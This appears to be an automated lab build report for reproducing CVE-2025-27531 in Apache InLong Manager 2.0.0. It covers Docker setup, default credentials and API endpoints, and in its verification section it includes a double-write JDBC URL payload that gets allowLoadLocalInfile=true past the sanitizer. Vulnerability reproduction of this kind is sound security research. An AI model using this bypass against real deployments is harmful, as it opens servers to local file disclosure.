# Lab Build Report: CVE-2025-27531

## Lab Architecture

**CVE**: CVE-2025-27531 — Apache InLong Manager JDBC URL Sanitization Bypass  
**Architecture**: Multi-container Docker Compose setup  
**Project Name**: `cve-2025-27531`

### Containers

| Container | Image | Role | Port |
|-----------|-------|------|------|
| `cve-2025-27531-mysql` | Custom (mysql:8.0.28 + init schema) | Backend database with pre-loaded InLong Manager schema | 3306 |
| `cve-2025-27531-manager` | Custom (inlong/manager:2.0.0 + bind fix) | Vulnerable InLong Manager 2.0.0 REST API | 8083 |

### Network Topology

```
┌─────────────────────────────────────────────┐
│              docker network                  │
│                                             │
│  ┌──────────────────────┐                   │
│  │ Test Worker         │                   │
│  │ (this container)     │                   │
│  └──────────┬───────────┘                   │
│             │ HTTP :8083                     │
│  ┌──────────▼───────────┐                   │
│  │ cve-2025-27531-      │                   │
│  │ manager              │                   │
│  │ (dynamic IP)         │                   │
│  └──────────┬───────────┘                   │
│             │                               │
└─────────────┼───────────────────────────────┘
              │ lab-net
              │ JDBC :3306
   ┌──────────▼───────────┐
   │ cve-2025-27531-mysql │
   │ (dynamic IP)         │
   └──────────────────────┘
```

## Container Details

### cve-2025-27531-mysql
- **Base Image**: `mysql:8.0.28` (linux/amd64, emulated on arm64)
- **Custom**: Includes `init.sql` copied from `inlong/manager:2.0.0` at `/docker-entrypoint-initdb.d/init.sql`
- **Purpose**: Provides the `apache_inlong_manager` database with full schema (auto-initialized on first start)
- **Credentials**: `root` / `inlong`
- **Healthcheck**: `mysql -uroot -pinlong -e "SELECT 1 FROM apache_inlong_manager.inlong_group LIMIT 1"` — verifies schema exists
- **Network**: `lab-net` only (not directly accessible from worker)

### cve-2025-27531-manager
- **Base Image**: `inlong/manager:2.0.0` (arm64)
- **Custom**: Patched `server.host` from `127.0.0.1` to `0.0.0.0` to allow external access
- **Purpose**: Runs the vulnerable InLong Manager REST API (v2.0.0)
- **Context Path**: `/inlong/manager`
- **Credentials**: `admin` / `inlong`
- **Networks**: `lab-net` (for MySQL connectivity) + shared network (for worker access)
- **Environment Variables**:
  - `JDBC_URL=cve-2025-27531-mysql:3306`
  - `USERNAME=root` / `PASSWORD=inlong`

## Build Status

| Container | Build Status | Notes |
|-----------|-------------|-------|
| `cve-2025-27531-mysql` | ✅ Success | Custom image with init.sql baked in (volume mounts not available from worker) |
| `cve-2025-27531-manager` | ✅ Success | Single-layer patch on top of official image |

### Workarounds Applied

1. **MySQL init.sql baked into image**: The standard approach of mounting `init.sql` as a volume doesn't work because the Docker socket connects to the host daemon, and worker container paths aren't host paths. Solution: extracted `init.sql` from the manager image and COPY'd it into a custom MySQL image.

2. **server.host patched to 0.0.0.0**: The default InLong Manager config binds to `127.0.0.1`, making it unreachable from outside the container. Patched in the Dockerfile via `sed`.

3. **MySQL 8.0.28 runs under amd64 emulation**: No arm64 build exists for mysql:8.0.28, so it runs under QEMU emulation on the arm64 host. Works correctly but may be slower.

## Start/Stop Commands

```bash
# Start lab
docker compose -p cve-2025-27531 -f ./CVE-2025-27531/lab/docker-compose.yml up -d

# Check status
docker compose -p cve-2025-27531 -f ./CVE-2025-27531/lab/docker-compose.yml ps

# View logs
docker compose -p cve-2025-27531 -f ./CVE-2025-27531/lab/docker-compose.yml logs manager

# Stop lab
docker compose -p cve-2025-27531 -f ./CVE-2025-27531/lab/docker-compose.yml down

# Full reset (with volume cleanup)
docker compose -p cve-2025-27531 -f ./CVE-2025-27531/lab/docker-compose.yml down -v
```

## Verification

### Service Accessibility
```
Manager Port: 8083
Context Path: /inlong/manager
Note: Manager IP is dynamically assigned (see docker inspect command below)
```

### Authentication Test ✅
```bash
# Get manager IP
MANAGER_IP=$(docker inspect cve-2025-27531-manager --format '{{range $net, $conf := .NetworkSettings.Networks}}{{$conf.IPAddress}}{{end}}')

curl -s -X POST "http://${MANAGER_IP}:8083/inlong/manager/api/anno/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"inlong"}'
# → {"success":true,"errMsg":null,"data":true}
```

### Vulnerability Bypass Confirmed ✅

**Sink Save Endpoint** (`POST /inlong/manager/api/sink/save`):
- **Input JDBC URL**: `jdbc:mysql://address=(host=127.0.0.1)(port=3306)(allowLoadallowLoadLocalInfile=trueLocalInfile=true)/test`
- **Stored JDBC URL**: `jdbc:mysql://address=(host=127.0.0.1)(port=3306)(allowLoadLocalInfile=true)/test`
- **Result**: The dangerous parameter `allowLoadLocalInfile=true` survived the single-pass sanitizer via the double-write technique

### API Endpoints Verified ✅
- `POST /inlong/manager/api/anno/login` — Authentication (admin/inlong) → success
- `POST /inlong/manager/api/group/save` — Create group → success
- `POST /inlong/manager/api/stream/save` — Create stream → success
- `POST /inlong/manager/api/sink/save` — Create sink with bypass URL → **bypass confirmed**
- `GET /inlong/manager/api/sink/get/{id}` — Retrieve stored sink → returns bypassed URL
- `POST /inlong/manager/api/node/save` — Create node → success (no group/stream required)

## Access Information for PoC Agent

| Item | Value |
|------|-------|
| **Manager URL** | `http://<manager-ip>:8083/inlong/manager` |
| **Login Endpoint** | `POST /inlong/manager/api/anno/login` |
| **Login Body** | `{"username":"admin","password":"inlong"}` |
| **Sink Save Endpoint** | `POST /inlong/manager/api/sink/save` |
| **Node Save Endpoint** | `POST /inlong/manager/api/node/save` |
| **Container Name** | `cve-2025-27531-manager` |
| **Get Manager IP** | `docker inspect cve-2025-27531-manager --format '{{range $net, $conf := .NetworkSettings.Networks}}{{$conf.IPAddress}}{{end}}'` |

## Lab Files

| File | Description |
|------|-------------|
| `docker-compose.yml` | Docker Compose orchestration |
| `Dockerfile.vulnerable` | Vulnerable manager image (bind to 0.0.0.0) |
| `Dockerfile.mysql` | MySQL with pre-loaded InLong schema |
| `init.sql` | InLong Manager database schema (72KB) |

## Known Issues

1. **MySQL under emulation**: mysql:8.0.28 runs under amd64 QEMU emulation. First start takes ~90s for schema init. Subsequent restarts are faster.
2. **No Pulsar/Flink**: The lab intentionally omits Pulsar, Flink, and other InLong services. These are not needed for the JDBC URL sanitization bypass PoC. Creating groups/sinks that require Pulsar interaction will fail at execution time (but sink *creation* succeeds, which is all we need).
3. **Connection pool errors in logs**: The Druid connection pool logs periodic errors when the DB is not yet ready. These resolve once MySQL is fully initialized and are harmless.
